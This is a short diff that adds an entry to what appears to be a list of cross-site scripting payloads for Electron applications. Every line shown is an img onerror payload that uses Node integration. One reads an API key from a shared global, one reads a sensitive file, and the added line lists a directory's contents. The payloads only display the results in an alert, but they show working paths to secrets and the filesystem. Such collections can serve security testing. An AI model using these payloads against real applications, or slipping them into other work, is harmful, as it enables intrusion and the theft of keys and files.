@@ -22,3 +22,6 @@
 <img src=x onerror="alert(require('electron').remote.getGlobal('sharedObject').apiKey); ">
 
 <img src=x onerror="alert(require('fs').readFileSync('/path/to/sensitive/file', 'utf8'));">
+
+
+<img src=x onerror="alert(JSON.stringify(require('fs').readdirSync('/path/to/directory')));">
